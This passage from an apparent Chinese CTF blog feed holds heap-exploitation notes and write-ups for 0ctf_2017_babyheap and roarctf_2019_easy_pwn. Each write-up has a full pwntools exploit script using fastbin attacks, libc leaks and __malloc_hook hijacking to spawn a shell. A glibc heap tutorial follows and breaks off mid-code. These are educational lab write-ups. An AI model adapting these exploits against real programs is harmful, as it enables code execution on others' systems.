0x10</strong>就能<strong>绕过检测</strong>，这里需要题目中存在一个存放p指针的数据结构</p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p>重要的话说三遍，高地址的chunk被合并后会被清空</p><p>绕过检测后执行</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">FD-&gt;<span class="hljs-keyword">bk </span>= <span class="hljs-keyword">BK;</span>      <br><span class="hljs-keyword">BK-&gt;fd </span>= FD;<br>等价于<br>p = &amp;p - <span class="hljs-number">0x10</span><br>p = &amp;p - <span class="hljs-number">0x18</span><br></code></pre></td></tr></table></figure><p>p是原本指向被unlink的chunk的chunk头的指针，此时已经指向了&amp;p-0x18，假设p原本被存放在bss段的一个数组(heap_array)中，那么此时修改p原本指向的chunk的内容，就变成了修改bss段chunk头首地址在&amp;p-0x18的fake chunk的内容，通常就可以修改存放chunk指针的数组了</p><p>总结：</p><p>条件：</p><p>bss段存在chunk指针数组heap_arr(经典的用法)</p><p>第一种情况：存在uaf，使被合并chunk在被free后还能修改chunk中的fd和bk指针</p><p>第二种情况：存在堆溢出，将被合并的chunk伪装成释放状态</p><p>构造：一般是后向合并，即free掉高地址的chunk，去合并低地址的chunk。在被合并chunk的usr_data中再伪造一个chunk，构造该chunk的fd和bk(fake_fd &#x3D; &amp;p - 0x18   fake_bk &#x3D; &amp;p - 0x10)，同时将高地址chunk的prev_size位设置成伪造的chunk的大小(包括chunk_header)，size位的最低地址设置为0。</p><p>效果：</p><p>p &#x3D; &amp;p - 0x18</p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong>，&amp;p是该指针在heap_array中的地址，unlink后再去修改该指针指向的chunk的内容就变成了修改heap_array的内容</p><h2 id="3-例题："><a href="#3-例题：" class="headerlink" title="3.例题："></a>3.例题：</h2><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unlink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0ctf_2017_babyheap</title>
    <link href="/2023/05/18/0ctf-2017-babyheap/"/>
    <url>/2023/05/18/0ctf-2017-babyheap/</url>
    
    <content type="html"><![CDATA[<h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p>非常经典的堆题，涉及了不少知识点和坑，做个记录</p><p><strong>题目概述</strong>：</p><p>有alloc、fill、free、dump,fill里存在堆溢出</p><p>堆的信息记录在mmap随机分配的heap_array中，</p><p>每个heap_array单元有24个字节</p><p>低地址8位记录堆是否被释放，没有被释放1，已经被释放0</p><p>中间8位记录申请的大小(用户输入值，不是chunk_size)</p><p>高地址8位记录申请的chunk地址(指向usr_data)</p><p>保护全开</p><p>1.pie + 堆溢出 + fastbin_attack</p><p>在开了pie的情况下，由于堆内存是连续的并且第一个chunk的地址的低3位一定为0，对相距较近的chunk（只有最后一个字节不同），可以利用堆溢出只修改fastbin中chunk的fd指针的最后一个字节来把其它chunk放到fastbin中，再malloc申请出来可以达到多个指针指向同一个chunk的效果。</p><p>2.unsorted bin leak</p><p>small bin大小的chunk被free后进入unsorted bin，unsorted bin中只有一个chunk时，其fd和bk都指向main_arena + 88,有多个时，链表两端的chunk的fd和bk之一指向main_arena + 88。把一个small bin大小的chunk释放进入unsorted bin后再打印其中的内容就能泄露libc，<strong>泄露main_arena + 88后leak_addr - 88 - 0x10就是__malloc_hook的地址，然后就能使用LibcSearcher</strong>了。这要求<strong>有uaf或两个指针都指向该chunk</strong>。</p><p><strong>注意：将small bin释放到unsorted bin中时一定要确保其上方还有chunk，否则会被top_chunk合并而不进入任何bins中</strong></p><p>3.堆溢出 + fastbin attack劫持malloc_hook为one_gadget</p><p>因为知道了libc版本，也能获取.so文件，不用构造system(‘&#x2F;bin&#x2F;sh\x00’)而是直接使用one_gadget</p><p> 注意：本地和靶机的libc版本不同(哪怕是细微的不同)，one_gadget的地址也会不同，需要重新查看one_gadget的地址</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,binary=<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;mode4.buuoj.cn&#x27;,26272)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx,size,content</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>io.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dlt</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(io)<br>pause()<br><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2 </span><br><span class="hljs-comment">#开了pie，需要先让1的fd指向2，再通过修改最后一字节来使其指向4，否则只申请0、1即可</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br><br>dlt(<span class="hljs-number">1</span>)<br>dlt(<span class="hljs-number">2</span>)<br><br><br>payload1 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;\x80&#x27;</span><br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload1),payload1)<br>payload2= p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload2),payload2)<br>alloc(<span class="hljs-number">0x10</span>)  <span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x10</span>)  <span class="hljs-comment">#2(4)</span><br><br>payload3= p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload3),payload3)<br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#5   #prevent from being involved by top_chunk</span><br>dlt(<span class="hljs-number">2</span>)<br><br>dump(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: \x0a&#x27;</span>)<br>leak = u64((io.recv(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>main_arena_addr = leak - <span class="hljs-number">88</span><br>__malloc_hook = main_arena_addr - <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__malloc_hook))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,__malloc_hook)<br>libc_base = __malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2(4)   #split the 0x91 chunk</span><br>dlt(<span class="hljs-number">2</span>)<br>payload4=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)+p64(__malloc_hook - <span class="hljs-number">0x23</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload4),payload4)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#6 -- __malloc_hook</span><br><br>one_gadget = libc_base + <span class="hljs-number">0x4526a</span><br>payload5 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x13</span> + p64(one_gadget) <br>fill(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(payload5),payload5)<br><br>alloc(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#debug()</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unsorted_bin_leak</tag>
      
      <tag>fastbin_attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>roarctf_2019_easy_pwn</title>
    <link href="/2023/05/18/roarctf-2019-easy-pwn/"/>
    <url>/2023/05/18/roarctf-2019-easy-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="buu刷题记录-roarctf-2019-easy-pwn"><a href="#buu刷题记录-roarctf-2019-easy-pwn" class="headerlink" title="buu刷题记录 roarctf_2019_easy_pwn"></a>buu刷题记录 roarctf_2019_easy_pwn</h1><p>一眼off_by_one,本以为很简单，没想到看着wp做还碰到不少坑，有必要做个记录</p><h2 id="程序特征："><a href="#程序特征：" class="headerlink" title="程序特征："></a>程序特征：</h2><p>1.有heap_arr且在bss段且其中记了size和inuse（在这题似乎不重要）</p><p>2.off by one</p><p>3.calloc</p><p>4.有edit和show</p><h2 id="知识点及思路："><a href="#知识点及思路：" class="headerlink" title="知识点及思路："></a>知识点及思路：</h2><p>1.基于<strong>off by one</strong>的<strong>后向拓展</strong>，即修改低地址chunk的size位并在高地址chunk的user_data部分伪造一个chunk，使其size和prev_inuse与低地址chunk的size对应，然后重新释放再申请（一般来说前向合并，后向拓展），使低地址chunk直接包含了高地址chunk的一部分，为unsorted的利用作铺垫</p><p>2.<strong>unsorted bin leak</strong> 完顺水推舟，改被覆盖的chunk的size使其符合__malloc_hook-0x23处的假chunk的size， <strong>unsorted bin attack</strong> 劫持 malloc_hook</p><p><strong>3.同时覆盖malloc_hook和realloc_hook来满足one_gadget的条件（重点）</strong></p><ul><li><p>malloc_hook地址的低8字节(32位四字节)，即一个地址单元处就是realloc_hook,所以可以一起覆盖</p></li><li><p>看一下realloc函数，</p></li></ul><p><img src="/2023/05/18/roarctf-2019-easy-pwn/QQ%E6%88%AA%E5%9B%BE20230417233948.png" alt="QQ截图20230417233948"></p><p><img src="/2023/05/18/roarctf-2019-easy-pwn/QQ%E6%88%AA%E5%9B%BE20230417233903.png" alt="QQ截图20230417233903"></p><p>可以看到，一开始是一堆push，这些push可以用来调栈，一共有6个，调1-6个单元都行，然后查看relloc_hook是否为空，不为空则执行realloc_hook指向的代码</p><ul><li><p>所以，可以这样利用，覆盖使</p><p>realloc_hook &#x3D; one_gadget</p><p>malloc_hook &#x3D; realloc_addr + offset</p><p>这里的offset取决于你想怎么调栈，不知道怎么调可以一个个试</p></li></ul><p>那么执行的过程是这样的：</p><p>malloc -&gt; malloc_hook(执行realloc+n)  -&gt; realloc_hook(one_gadget)</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><p>wp网上有，注意百度到的第一个wp里面的realloc_hook命名的不对，应该是realloc_addr,不复述过程了，放个本地跑的exp，libc版本libc6_2.23-0ubuntu11.3_amd64  (libc小版本不同都会导致one_gadget的偏移不同)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,binary=<span class="hljs-string">&#x27;roarctf_2019_easy_pwn&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,28483)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;size: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&#x27;size: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>io.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(io,<span class="hljs-string">b&#x27;&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#3</span><br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x20</span>) + p8(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,payload2)<br><br>free(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br><br>payload3 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,payload3)<br><br>free(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>io.recv(<span class="hljs-number">0x20</span>)<br><br>main_arena88 = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_arena88))<br>__malloc_hook = main_arena88 - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,__malloc_hook)<br>libc_base = __malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br>realloc = libc.dump(<span class="hljs-string">&quot;realloc&quot;</span>) + libc_base<br><br>create(<span class="hljs-number">0x80</span>)  <span class="hljs-comment">#2</span><br>payload4 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,payload4)<br>payload5 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) <br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,payload5)<br>free(<span class="hljs-number">2</span>)<br><br>payload6 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) + p64(__malloc_hook-<span class="hljs-number">0x23</span>)*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,payload6)<br><br>create(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4  __malloc_hook</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__malloc_hook-<span class="hljs-number">0x10</span>))<br><br><br>one_gadget = libc_base + <span class="hljs-number">0xf1247</span><br>payload7 = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">11</span>  + p64(one_gadget) +  p64(realloc+<span class="hljs-number">4</span>) <br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x13</span>+<span class="hljs-number">8</span>,payload7)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x60</span>)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unsorted_bin_leak</tag>
      
      <tag>off_by_one</tag>
      
      <tag>realloc_hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc堆漏洞利用基础</title>
    <link href="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="glibc堆-ptmalloc-漏洞利用基础"><a href="#glibc堆-ptmalloc-漏洞利用基础" class="headerlink" title="glibc堆(ptmalloc)漏洞利用基础"></a>glibc堆(ptmalloc)漏洞利用基础</h1><p>​                                     虚拟内存示意图</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.jpg" alt="虚拟内存"></p><h2 id="1-Arena和malloc-state"><a href="#1-Arena和malloc-state" class="headerlink" title="1.Arena和malloc_state"></a>1.Arena和malloc_state</h2><p>arena即堆内存本身,概念上arena &gt; heap &gt; chunk</p><p>主线程的arena称为main_arena,由sbrk函数向内核申请一大片内存创建，最开始调用sbrk函数创建大小为(128 KB + chunk_size) align 4KB的空间作为heap。当已经申请的内存不够时会调用sbrk向系统申请内存给 <code>malloc_state.top</code>，使brk指针向上沿伸，但如果沿伸到了内存映射段，则调用mmap映射一块内存给main_arena，此时brk不再指向main_arena顶部,main_arena将无法被收回。</p><p>其它线程的arena称为thread_arena,最开始调用 mmap 映射一块大小为HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统上默认为 64MB）的空间作为 sub-heap。当不够用时，会调用 mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增加的值都会对齐到4KB。这样，一个thread_arena由多个heap构成，每个heap均由mmap获得，最大为1M，多个heap间可能不相邻,top chunk在最高地址的heap中，每个heap的最低地址的_heap_info中的prev指针指向前一个heap。</p><p><strong>泄露libc</strong>：在能够查看内存分配的环境下（本地<code>vmmap</code>，远程环境通过<strong>传非法地址</strong>泄露内存分配），通过申请大内存块，可通过利用<code>mmap</code>分配到的内存块地址与<code>libc</code>基址之间的固定偏移量泄露<code>libc</code>地址。</p><p>多个arena间通过链表连接，如下</p><p>main_arena —&gt; arena1 —&gt; arena2 —&gt; ………..</p><p>arena数量上限与系统和处理器核心数有关，并且有锁的机制，如果所有arena都上锁了，线程需要等待</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span>位系统中：<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">2</span> * number of cores + <span class="hljs-number">1</span>.<br><span class="hljs-attribute">64</span>位系统中：<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">8</span> * number of cores + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>malloc_state是一个结构体，thread arena对应的malloc_state存储在各自本身的arena的_heap_info上方， _heap_info在每个heap的低地址开头.</p><p>main_arena的malloc_state是一个全局变量，在 libc.so 的数据段,偏移固定，所以知道了main_arena的地址就能泄露libc的基址</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/main_arena.jpg" alt="main_arena"></p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/thread_arena.jpg" alt="thread_arena"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<span class="hljs-comment">//用于进程间的互斥，同一个arena同时只能被一个进程访问</span><br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<span class="hljs-comment">//表示arena是否存在fastbin或者内存是否连续等信息</span><br><br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-type">int</span> have_fastchunks;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  <span class="hljs-comment">//一个用来存放所有fastbin链表的数组,最多10个fastbin链表</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<span class="hljs-comment">//指向top chunk</span><br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<span 